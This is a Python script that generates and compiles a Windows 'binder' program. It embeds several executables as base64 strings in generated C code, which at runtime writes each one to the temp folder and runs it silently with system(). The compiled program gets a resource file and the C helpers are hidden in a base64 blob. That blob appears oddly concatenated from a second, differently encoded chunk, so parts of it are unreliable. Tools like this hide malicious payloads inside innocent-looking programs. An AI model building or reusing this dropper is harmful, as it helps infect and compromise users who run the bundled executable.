import base64, sys

exe_files = sys.argv[1:]
if len(exe_files) < 2:
    input("YOU NEED 2 or more files")
    exit(1)
shell_code = []
dec = '"'
def add_newline_if_long(string):
    if len(string) > 9999:
        lines = [string[i:i+9999] for i in range(0, len(string), 9999)]
        string = '\n'.join([dec + line + dec for line in lines])
    else:
        string = dec + string + dec
    return string

for data in exe_files:
    try:
        with open(data, "rb") as file:
            binary_data = file.read()
            encoded_data = base64.b64encode(binary_data).decode('utf-8')
            string = add_newline_if_long(encoded_data)
            shell_code.append(string)
    except Exception as e:
        print("Error combining {}\nERROR: {}".format(data,e))


insert = ""
b64vars = []
files = []
for i, code in enumerate(shell_code):
    encoded_code = code
    b64vars.append(encoded_code)
b64strings = "const char *encoded_strings[] = {{{}}};".format(", ".join(b64vars))
c_functions = "I2luY2x1ZGUgPHN0ZGludC5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8c3RyaW5nLmg+CgpzdGF0aWMgY2hhciBlbmNvZGluZ190YWJsZVtdID0geydBJywgJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdZJywgJ1onLCAnYScsICdiJywgJ2MnLCAnZCcsICdlJywgJ2YnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdnJywgJ2gnLCAnaScsICdqJywgJ2snLCAnbCcsICdtJywgJ24nLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdvJywgJ3AnLCAncScsICdyJywgJ3MnLCAndCcsICd1JywgJ3YnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3JywgJ3gnLCAneScsICd6JywgJzAnLCAnMScsICcyJywgJzMnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICc0JywgJzUnLCAnNicsICc3JywgJzgnLCAnOScsICcrJywgJy8nfTsKc3RhdGljIGNoYXIgKmRlY29kaW5nX3RhYmxlID0gTlVMTDsKCnZvaWQgYnVpbGRfZGVjb2RpbmdfdGFibGUoKSB7CiAgICBkZWNvZGluZ190YWJsZSA9IG1hbGxvYygyNTYpOwogICAgZm9yIChpbnQgaSA9IDA7IGkgPCA2NDsgaSsrKQogICAgICAgIGRlY29kaW5nX3RhYmxlWyh1bnNpZ25lZCBjaGFyKWVuY29kaW5nX3RhYmxlW2ldXSA9IGk7Cn0KCnVuc2lnbmVkIGNoYXIgKmJhc2U2NF9kZWNvZGUoY29uc3QgY2hhciAqZGF0YSwgc2l6ZV90IGlucHV0X2xlbmd0aCwgc2l6ZV90ICpvdXRwdXRfbGVuZ3RoKSB7CiAgICBpZiAoZGVjb2RpbmdfdGFibGUgPT0gTlVMTCkKICAgICAgICBidWlsZF9kZWNvZGluZ190YWJsZSgpOwogICAgaWYgKGlucHV0X2xlbmd0aCAlIDQgIT0gMCkKICAgICAgICByZXR1cm4gTlVMTDsKICAgICpvdXRwdXRfbGVuZ3RoID0gaW5wdXRfbGVuZ3RoIC8gNCAqIDM7CiAgICBpZiAoZGF0YVtpbnB1dF9sZW5ndGggLSAxXSA9PSAnPScpCiAgICAgICAgKCpvdXRwdXRfbGVuZ3RoKS0tOwogICAgaWYgKGRhdGFbaW5wdXRfbGVuZ3RoIC0gMl0gPT0gJz0nKQogICAgICAgICgqb3V0cHV0X2xlbmd0aCktLTsKICAgIHVuc2lnbmVkIGNoYXIgKmRlY29kZWRfZGF0YSA9IG1hbGxvYygqb3V0cHV0X2xlbmd0aCArIDEpOwogICAgaWYgKGRlY29kZWRfZGF0YSA9PSBOVUxMKQogICAgICAgIHJldHVybiBOVUxMOwogICAgZm9yIChpbnQgaSA9IDAsIGogPSAwOyBpIDwgaW5wdXRfbGVuZ3RoOykgewogICAgICAgIHVpbnQzMl90IHNleHRldF9hID0gZGF0YVtpXSA9PSAnPScgPyAwICYgaSsrIDogZGVjb2RpbmdfdGFibGVbZGF0YVtpKytdXTsKICAgICAgICB1aW50MzJfdCBzZXh0ZXRfYiA9IGRhdGFbaV0gPT0gJz0nID8gMCAmIGkrKyA6IGRlY29kaW5nX3RhYmxlW2RhdGFbaSsrXV07CiAgICAgICAgdWludDMyX3Qgc2V4dGV0X2MgPSBkYXRhW2ldID09ICc9JyA/IDAgJiBpKysgOiBkZWNvZGluZ190YWJsZVtkYXRhW2krK11dOwogICAgICAgIHVpbnQzMl90IHNleHRldF9kID0gZGF0YVtpXSA9PSAnPScgPyAwICYgaSsrIDogZGVjb2RpbmdfdGFibGVbZGF0YVtpKytdXTsKICAgICAgICB1aW50MzJfdCB0cmlwbGUgPSAoc2V4dGV0X2EgPDwgMyAqIDYpICsgKHNleHRldF9iIDw8IDIgKiA2KSArIChzZXh0ZXRfYyA8PCAxICogNikgKyAoc2V4dGV0X2QgPDwgMCAqIDYpOwogICAgICAgIGlmIChqIDwgKm91dHB1dF9sZW5ndGgpCiAgICAgICAgICAgIGRlY29kZWRfZGF0YVtqKytdID0gKHRyaXBsZSA+PiAyICogOCkgJiAweEZGOwogICAgICAgIGlmIChqIDwgKm91dHB1dF9sZW5ndGgpCiAgICAgICAgICAgIGRlY29kZWRfZGF0YVtqKytdID0gKHRyaXBsZSA+PiAxICogOCkgJiAweEZGOwogICAgICAgIGlmIChqIDwgKm91dHB1dF9sZW5ndGgpCiAgICAgICAgICAgIGRlY29kZWRfZGF0YVtqKytdID0gKHRyaXBsZSA+PiAwICogOCkgJiAweEZGOwogICAgfQogICAgZGVjb2RlZF9kYXRhWypvdXRwdXRfbGVuZ3RoXSA9ICdcMCc7CiAgICByZXR1cm4gZGVjb2RlZF9kYXRhOwp9Cgp2b2lkIGJhc2U2NF9jbGVhbnVwKCkgewogICAgZnJlZShkZWNvZGluZ190YWJsZSk7Cn0KCgovLyBGdW5jdGlvbiB0byBkZWNvZGUgQmFzZTY0IGRhdGEKdW5zaWduZWQgY2hhciAqYmFzZTY0X2RlY29kZShjb25zdCBjaGFyICpkYXRhLCBzaXplX3QgaW5wdXRfbGVuZ3RoLCBzaXplX3QgKm91dHB1dF9sZW5ndGgpOw==/ACAAMAAgACYAIABpACsAKwAgADoAIABkAGUAYwBvAGQAaQBuAGcAXwB0AGEAYgBsAGUAWwBkAGEAdABhAFsAaQArACsAXQBdADsACgAgACAAIAAgACAAIAAgACAAdQBpAG4AdAAzADIAXwB0ACAAcwBlAHgAdABlAHQAXwBjACAAPQAgAGQAYQB0AGEAWwBpAF0AIAA9AD0AIAAnAD0AJwAgAD8AIAAwACAAJgAgAGkAKwArACAAOgAgAGQAZQBjAG8AZABpAG4AZwBfAHQAYQBiAGwAZQBbAGQAYQB0AGEAWwBpACsAKwBdAF0AOwAKACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ADMAMgBfAHQAIABzAGUAeAB0AGUAdABfAGQAIAA9ACAAZABhAHQAYQBbAGkAXQAgAD0APQAgACcAPQAnACAAPwAgADAAIAAmACAAaQArACsAIAA6ACAAZABlAGMAbwBkAGkAbgBnAF8AdABhAGIAbABlAFsAZABhAHQAYQBbAGkAKwArAF0AXQA7AAoAIAAgACAAIAAgACAAIAAgAHUAaQBuAHQAMwAyAF8AdAAgAHQAcgBpAHAAbABlACAAPQAgACgAcwBlAHgAdABlAHQAXwBhACAAPAA8ACAAMwAgACoAIAA2ACkAIAArACAAKABzAGUAeAB0AGUAdABfAGIAIAA8ADwAIAAyACAAKgAgADYAKQAgACsAIAAoAHMAZQB4AHQAZQB0AF8AYwAgADwAPAAgADEAIAAqACAANgApACAAKwAgACgAcwBlAHgAdABlAHQAXwBkACAAPAA8ACAAMAAgACoAIAA2ACkAOwAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoAGoAIAA8ACAAKgBvAHUAdABwAHUAdABfAGwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABkAGUAYwBvAGQAZQBkAF8AZABhAHQAYQBbAGoAKwArAF0AIAA9ACAAKAB0AHIAaQBwAGwAZQAgAD4APgAgADIAIAAqACAAOAApACAAJgAgADAAeABGAEYAOwAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoAGoAIAA8ACAAKgBvAHUAdABwAHUAdABfAGwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABkAGUAYwBvAGQAZQBkAF8AZABhAHQAYQBbAGoAKwArAF0AIAA9ACAAKAB0AHIAaQBwAGwAZQAgAD4APgAgADEAIAAqACAAOAApACAAJgAgADAAeABGAEYAOwAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoAGoAIAA8ACAAKgBvAHUAdABwAHUAdABfAGwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABkAGUAYwBvAGQAZQBkAF8AZABhAHQAYQBbAGoAKwArAF0AIAA9ACAAKAB0AHIAaQBwAGwAZQAgAD4APgAgADAAIAAqACAAOAApACAAJgAgADAAeABGAEYAOwAKACAAIAAgACAAfQAKACAAIAAgACAAZABlAGMAbwBkAGUAZABfAGQAYQB0AGEAWwAqAG8AdQB0AHAAdQB0AF8AbABlAG4AZwB0AGgAXQAgAD0AIAAnAFwAMAAnADsACgAgACAAIAAgAHIAZQB0AHUAcgBuACAAZABlAGMAbwBkAGUAZABfAGQAYQB0AGEAOwAKAH0ACgAKAHYAbwBpAGQAIABiAGEAcwBlADYANABfAGMAbABlAGEAbgB1AHAAKAApACAAewAKACAAIAAgACAAZgByAGUAZQAoAGQAZQBjAG8AZABpAG4AZwBfAHQAYQBiAGwAZQApADsACgB9AAoACgAKAC8ALwAgAEYAdQBuAGMAdABpAG8AbgAgAHQAbwAgAGQAZQBjAG8AZABlACAAQgBhAHMAZQA2ADQAIABkAGEAdABhAAoAdQBuAHMAaQBnAG4AZQBkACAAYwBoAGEAcgAgACoAYgBhAHMAZQA2ADQAXwBkAGUAYwBvAGQAZQAoAGMAbwBuAHMAdAAgAGMAaABhAHIAIAAqAGQAYQB0AGEALAAgAHMAaQB6AGUAXwB0ACAAaQBuAHAAdQB0AF8AbABlAG4AZwB0AGgALAAgAHMAaQB6AGUAXwB0ACAAKgBvAHUAdABwAHUAdABfAGwAZQBuAGcAdABoACkAOwA="
c_code = f"""
#include <windows.h>
{base64.b64decode(c_functions).decode()}

int main() {{
{insert}
    {b64strings}
    int num_strings = sizeof(encoded_strings) / sizeof(encoded_strings[0]);

    for (int i = 0; i < num_strings; i++) {{
        const char *encoded_data = encoded_strings[i];
        size_t encoded_length = strlen(encoded_data);
        size_t decoded_length;
        unsigned char *decoded_data = base64_decode(encoded_data, encoded_length, &decoded_length);

        if (decoded_data != NULL) {{
            char str[100];
            char tempPath[MAX_PATH];
            DWORD tempPathResult = GetTempPathA(MAX_PATH, tempPath);

            if (tempPathResult > 0 && tempPathResult <= MAX_PATH) {{
                printf("Temporary Path: %s\\n", tempPath);
            }} else {{
                printf("Failed to retrieve the temporary path.\\n");
            }}

            char tempFileName[L_tmpnam];
            char temp_file[sizeof(tempFileName) - 1];
            if (tmpnam(tempFileName) != NULL) {{
                    memmove(temp_file, tempFileName + 1, sizeof(tempFileName) - 1);
            }} else {{
                printf("Failed to generate temporary file name.\\n");
            }}
            strcat(tempPath, temp_file);
            strcat(tempPath, "exe");
            printf(tempPath);
            FILE* execute = fopen(tempPath, "wb");
            if (execute == NULL) {{
                printf("Failed to open the temporary file.\\n");
                return 1;
            }}
            fwrite(decoded_data, sizeof(unsigned char), decoded_length, execute);
            fclose(execute);
            char command[256];
            snprintf(command, sizeof(command), "%s", tempPath);
            int result = system(command);
            if (result == -1) {{
                printf("Failed to execute the temporary file.\\n");
                return 1;
            }}

            // Free the memory allocated for decoded data
            free(decoded_data);
        }}
    }}

    return 0;
}}
"""

with open("file.c", "w") as f:
    f.write(c_code)

print("BUILDING. If you get an error it means C isnt installed.")
import os
os.system("windres my.rc -O coff -o my.res")
os.system("gcc file.c my.res -o file.exe")
print("WARNING OPENING THE C PROGRAM ON A DIFFERENT IDE CAN BREAK THE PROGRAM.")